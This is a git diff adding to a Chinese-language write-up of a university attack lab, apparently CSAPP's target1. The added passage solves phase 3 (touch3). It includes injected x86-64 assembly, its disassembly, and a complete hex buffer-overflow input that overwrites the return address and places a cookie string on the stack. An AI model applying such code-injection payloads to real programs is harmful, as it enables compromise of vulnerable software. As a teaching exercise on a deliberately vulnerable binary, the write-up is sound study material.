@@ -196,9 +196,9 @@ retq
 
 ```
 ➜  vim task2code.s
-➜  target1 git:(master) ✗ gcc -c task2code.s 
+➜  gcc -c task2code.s 
 ➜  objdump -d task2code.o > task2code.d
-cat task2code.d
+➜  cat task2code.d
 
 task2code.o:     file format elf64-x86-64
 
@@ -249,3 +249,64 @@ a8 dc 61 55 00 00 00 00
 ```
 
 3. touch3()
+
+0x59b997fa是实验的cookie，其字符串（末尾有'\n'）表示为:
+
+```
+35 39 62 39 39 37 66 61 00
+```
+
+相比于touch2，这会传递的参数不再是直接cookie本身，而是需要先将cookie字符串放到一个合适的位置，然后再传递这个位置的地址作为参数，同时要考虑在hexmatch和strncmp函数被调用时栈上数据会被更改的可能性。为了防止在调用 hexmatch和strncmp函数时可能对栈结构造成的破坏，我们把cookie存到地址的较高位置，即比getbuf的ret地址处的更高位置，getbuf的ret地址是0x5561dca0,那么将字符串就存到比他高的地方：
+
+因此可以先确定注入代码：
+
+```
+pushq $0x5561dca8  
+pop %rdi
+push $0x4018fa
+retq
+```
+
+获得对应的机器代码指令序列：
+
+```
+➜  target1 git:(master) ✗ vim task3code.s
+➜  target1 git:(master) ✗ gcc -c task3code.s
+➜  target1 git:(master) ✗ objdump -d task3code.o > task3code.d
+➜  target1 git:(master) ✗ cat task3code.d
+
+task3code.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	68 a8 dc 61 55       	pushq  $0x5561dca8
+   5:	5f                   	pop    %rdi
+   6:	68 fa 18 40 00       	pushq  $0x4018fa
+   b:	c3                   	retq  
+```
+
+因此注入代码机器指令序列：
+
+```
+68 a8 dc 61 55 5f 68 fa 18 40 00 c3
+```
+
+然后可得输入字符串内容：
+
+![image-20210507162732674](/home/lalawang/.config/Typora/typora-user-images/image-20210507162732674.png)
+
+输入文本：
+
+```
+68 a8 dc 61 55 5f 68 fa
+18 40 00 c3 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+```
+
